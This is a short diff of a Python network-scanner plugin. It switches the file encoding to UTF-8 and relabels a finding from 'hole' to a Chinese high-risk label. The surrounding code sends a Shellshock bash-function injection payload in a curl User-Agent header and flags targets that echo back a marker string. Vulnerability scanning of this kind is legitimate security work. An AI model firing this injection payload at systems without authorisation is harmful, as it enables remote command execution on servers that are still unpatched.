@@ -1,4 +1,6 @@
-# -*- coding: cp936 -*-
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
 """
 scanner - Network scanner.
 Author : Tommy.
@@ -21,7 +23,7 @@ class P(T):
         payload = '''() { :;}; echo d5f4f931d08210b1ed6e98d26b6318b6:'''
         code, head, res, errcode, _ = curl.curl('-A "%s" %s' %(payload,arg))
         if code == 200 and 'd5f4f931d08210b1ed6e98d26b6318b6' in head+res:
-            output(arg,result,'hole')
+            output(arg,result,'高危(HOLE)')
     
         del curl
         return result
